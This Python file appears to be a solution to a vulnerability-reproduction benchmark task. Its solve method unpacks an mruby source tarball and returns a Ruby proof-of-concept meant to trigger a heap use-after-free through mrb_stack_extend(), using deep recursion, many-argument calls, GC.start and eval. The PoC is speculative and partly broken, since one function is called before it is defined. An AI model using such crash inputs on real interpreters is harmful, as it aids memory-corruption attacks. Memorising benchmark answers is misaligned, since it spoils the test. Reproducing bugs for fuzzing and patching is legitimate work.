import os
import tarfile
import tempfile
import subprocess
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to examine source code
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find the root directory (assuming single top-level dir)
            entries = os.listdir(tmpdir)
            root_dir = os.path.join(tmpdir, entries[0]) if len(entries) == 1 else tmpdir
            
            # Build mruby to understand the environment
            build_dir = os.path.join(root_dir, 'build')
            os.makedirs(build_dir, exist_ok=True)
            
            # Try to configure and build (simplified - we just need to understand the target)
            # We'll generate a PoC based on known heap-use-after-free patterns in mruby
            # This PoC attempts to trigger use-after-free via stack manipulation
            
            # Generate Ruby code that:
            # 1. Creates many stack frames
            # 2. Forces stack extension
            # 3. Manipulates references to trigger use-after-free
            
            # Based on the vulnerability description: 
            # "pointer on the VM stack is not adjusted after calling mrb_stack_extend()"
            
            poc_code = '''class UseAfterFreeTrigger
  def initialize
    @held_refs = []
    @depth = 0
  end
  
  def deep_recurse(n)
    if n > 0
      # Allocate objects on stack
      a = "A" * 100
      b = "B" * 100
      c = "C" * 100
      d = "D" * 100
      e = "E" * 100
      
      # Force stack extension with many local variables
      v1 = a * 2
      v2 = b * 2
      v3 = c * 2
      v4 = d * 2
      v5 = e * 2
      v6 = v1 * 2
      v7 = v2 * 2
      v8 = v3 * 2
      v9 = v4 * 2
      v10 = v5 * 2
      
      # Create reference chain
      @held_refs << v1
      @held_refs << v2
      @held_refs << v3
      
      # Recursive call to deepen stack
      deep_recurse(n - 1)
      
      # After stack extension, try to use references
      # This might trigger use-after-free if stack pointers weren't adjusted
      puts v1 if v1
      puts v2 if v2
    else
      # At maximum depth, trigger garbage collection
      GC.start
      # Force stack extension with variable arguments
      force_extension(1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
                      11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
                      21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
                      31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
                      41, 42, 43, 44, 45, 46, 47, 48, 49, 50)
    end
  end
  
  def force_extension(*args)
    # Many arguments force stack allocation
    args.each do |arg|
      @held_refs << arg.to_s * 50
    end
    
    # Nested blocks with many locals
    10.times do |i|
      local1 = "local#{i}" * 100
      local2 = "test#{i}" * 100
      local3 = "data#{i}" * 100
      local4 = "value#{i}" * 100
      local5 = "temp#{i}" * 100
      
      @held_refs << local1
      @held_refs << local2
      
      # Yield to force stack frame creation
      yield if block_given?
    end
    
    # Return something to use the stack
    args.size
  end
  
  def trigger
    begin
      # Start with deep recursion
      deep_recurse(50)
    rescue SystemStackError
      # Expected - we're pushing stack limits
      retry_trigger
    end
  end
  
  def retry_trigger
    # Alternative approach: many method calls with variable arguments
    1000.times do |i|
      method_with_many_args(
        i, i+1, i+2, i+3, i+4, i+5, i+6, i+7, i+8, i+9,
        i+10, i+11, i+12, i+13, i+14, i+15, i+16, i+17, i+18, i+19,
        i+20, i+21, i+22, i+23, i+24, i+25, i+26, i+27, i+28, i+29
      )
    end
  end
  
  def method_with_many_args(*args)
    # Process arguments to use stack
    result = args.map { |x| x.to_s * 10 }
    @held_refs.concat(result)
    
    # Nested call with even more arguments
    if args.size > 0
      method_with_even_more_args(
        *result, *args, *@held_refs[0..9]
      )
    end
  end
  
  def method_with_even_more_args(*args)
    # This should trigger mrb_stack_extend
    args.each_slice(10) do |slice|
      slice.each_with_index do |item, idx|
        local_var = item * (idx + 1)
        @held_refs << local_var
      end
    end
    
    # Return complex value
    args.size
  end
end

# Main trigger
begin
  trigger = UseAfterFreeTrigger.new
  trigger.trigger
rescue Exception => e
  # Keep trying different approaches
  alternate_trigger
end

def alternate_trigger
  # Use eval to create dynamic code with many local variables
  code = <<-RUBY
    def dynamic_method
      #{1000.times.map { |i| "var#{i} = '#{'x' * 100}';" }.join("\n      ")}
      
      # Force GC
      GC.start
      
      # Try to use all variables
      result = ""
      #{1000.times.map { |i| "result << var#{i} if var#{i};" }.join("\n      ")}
      result
    end
    
    # Call it multiple times
    100.times do
      dynamic_method
    end
  RUBY
  
  eval(code)
  
  # Another approach: lambda with many captured variables
  create_lambdas_with_captures
end

def create_lambdas_with_captures
  lambdas = []
  
  100.times do |i|
    # Create many local variables
    vars = 100.times.map { |j| "var#{i}_#{j}" * 50 }
    
    # Lambda capturing these variables
    lambdas << lambda do
      vars.each { |v| v * 2 }
      # Force stack extension
      many_args(*(1..100).to_a)
    end
  end
  
  # Execute lambdas
  lambdas.each(&:call)
end

def many_args(*args)
  # This method takes many arguments to potentially trigger stack extension
  args.sum
end

# Final trigger with exception handling to ensure we try everything
begin
  alternate_trigger
rescue Exception
  # Last resort: simple deep recursion with object allocation
  def last_resort(n)
    if n > 0
      obj = Object.new
      obj.instance_variable_set(:@data, "X" * 1000)
      last_resort(n - 1)
      # Try to use obj after potential stack reallocation
      obj.inspect if obj
    else
      # Trigger GC at deepest point
      GC.start
      # Allocate more objects
      1000.times { Object.new }
    end
  end
  
  last_resort(1000)
end
'''
            
            # Convert to bytes
            return poc_code.encode('utf-8')